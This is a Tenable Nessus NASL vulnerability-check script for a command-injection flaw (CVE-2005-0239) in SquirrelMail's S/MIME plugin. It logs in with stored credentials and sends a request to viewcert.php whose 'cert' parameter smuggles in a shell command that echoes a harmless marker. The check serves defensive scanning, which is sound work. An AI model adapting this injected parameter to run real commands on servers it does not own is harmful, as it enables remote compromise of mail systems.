#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(17257);
  script_version("$Revision: 1.21 $");
  script_cvs_date("$Date: 2011/11/22 15:08:25 $");

  script_cve_id("CVE-2005-0239");
  script_bugtraq_id(12467);
  script_osvdb_id(13639);
 
  script_name(english:"SquirrelMail S/MIME Plug-in Remote Command Execution");
  script_summary(english:"Checks for remote command execution vulnerability in SquirrelMail S/MIME Plugin");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to arbitrary
command execution attacks.");
  script_set_attribute(attribute:"description", value:
"The S/MIME plugin for SquirrelMail installed on the remote host does
not sanitize the 'cert' parameter used by the 'viewcert.php' script. 
An authenticated user can exploit this flaw to execute system commands
remotely in the context of the web server.");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ce80e4bd");
  script_set_attribute(attribute:"see_also", value:"http://www.squirrelmail.org/plugin_view.php?id=54");
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 0.6 or later of the plugin.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value:"2005/03/03");
  script_set_attribute(attribute:"vuln_publication_date", value:"2005/02/07");
  script_set_attribute(attribute:"patch_publication_date", value:"2005/02/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:squirrelmail:squirrelmail");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");

  script_dependencies("squirrelmail_detect.nasl");
  script_require_keys("imap/login", "imap/password", "www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


# nb: the only way to check for the vulnerability is to exploit it,
#     which requires we log in.
user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) exit(0);

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/squirrelmail"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  # Make sure the plugin's installed.
  r = http_send_recv3(method: "GET", item:string(dir, "/plugins/smime/viewcert.php"), port:port);
  if (isnull(r)) exit(0);
  if (string('a href="', dir, '/src/login.php"') >!< r[2]) exit(0);

  # Now log in.
  r = http_send_recv3(method: "GET", item:string(dir, "/src/login.php"), port:port);
  if (isnull(r)) exit(0);
  # - first grab the session cookie.
  sid = get_http_cookie(name: "SQMSESSID");
  if (isnull(sid)) {
    debug_print("can't get session cookie!\n");
    exit(1);
  }
  # - now send the username / password.
  postdata = string("login_username=", user, "&secretkey=", pass, "&js_autodetect_results=0&just_logged_in=1");
  r = http_send_recv3(method: "POST",  item: strcat(dir, "/src/redirect.php"),
 add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"),
 data: postdata, port: port);
  if (isnull(r)) exit(0);
  if (get_http_cookie(name: "SQMSESSID") == "deleted") {
    debug_print("user/password incorrect!\n");
    exit(1);
  }
  # Finally, try to exploit the flaw by having it display "Nessus was here"
  # in the Owner field.
  r = http_send_recv3(method: "GET", item:string(dir, "/plugins/smime/viewcert.php?cert=;echo%20subject=Nessus%20was%20here;"), port:port);
  # If "Nessus was here" appears in the Owner field, it's a problem.
  if (r[2] =~ "Owner:.+Nessus was here") security_warning(port);
}
